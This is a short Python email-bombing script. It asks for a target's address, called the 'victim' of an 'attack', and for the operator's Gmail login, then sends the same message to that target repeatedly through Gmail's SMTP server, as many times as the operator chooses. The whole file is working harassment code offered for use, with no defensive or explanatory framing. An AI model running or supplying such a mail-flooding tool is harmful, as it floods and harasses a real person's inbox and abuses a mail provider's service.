import smtplib
import time

victim_email= input("Enter Email address on Whom you want to perfom this attack: ")
email = input("Enter your gmail_address:")
password = input("Enter your gmail_password:")
message = input("Enter Message:")
counter = int(input("How many message you want to send?:"))

for x in range(0,counter):
        print("Number of Message Sent : ", x+1)
        mail = smtplib.SMTP('smtp.gmail.com',587)
        mail.ehlo()
        mail.starttls()
        mail.login(email,password)
        mail.sendmail(email,victim_email,message)
        time.sleep(1)
        mail.close()


